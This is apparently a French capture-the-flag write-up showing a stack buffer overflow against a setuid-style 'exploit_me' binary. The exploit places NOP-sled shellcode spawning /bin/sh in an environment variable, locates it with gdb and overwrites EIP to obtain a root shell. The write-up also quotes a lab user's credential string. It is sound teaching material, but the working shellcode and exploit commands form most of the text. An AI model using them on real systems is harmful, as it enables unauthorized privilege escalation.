# Solution 3

Pour cette solution, nous reprenons le `writeup1` pour revenir jusqu'à l'utilisateur `zaz`.

`zaz:646da671ca01bb5d84dbb5fb2238dc8e`

Nous reprenons l'exécutable `exploit_me` présent à la racine. Nous avions effectué une attaque par buffer overflow, qui grâce à un shellcode que nous avions mis en mémoire et exécuté via le `strcpy` non protégé.

```C
int main(int argc, char **argv)
{
    char buffer[140];

    if (argc > 1) {
        strcpy(buffer, argv[1]);
        puts(buffer);
    }
    return argc < 2;
}
```

Nous avions eu la place, dans les 140 caractères du buffer, de placer notre `shellcode`. Mais dans l'éventualité où ce buffer ai été trop petit, nous n'aurions pas pu le faire.

Une solution alternative aurait été de placer notre `shellcode` dans une `variable d'environnement`. En effet, les variables d'environnement sont chargées en mémoire et accessibles depuis le programme. Il nous suffit donc de trouver l'adresse de cette variable et de remplacer l'`EIP` par cette adresse.

On déclare donc notre variable d'environnement :

```shell
$ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
```

Puis on récupère son adresse grâce à `gdb` :

```shell
$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x80483f4
(gdb) run
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f4 in main ()
(gdb) x/s *((char **)environ)
0xbffff8a1:      "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
```

Notre shellcode est donc à l'adresse `0xbffff8a1`. Nous passerons donc l'addresse `0xbffff8c0` afin d'être sûr de tomber dans notre `nopslide`.

Voici le résultat :

```shell
$ ./exploit_me $(python -c 'print("A"*140 + "\xbf\xff\xf8\xc0"[::-1])')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# whoami
root
#
```
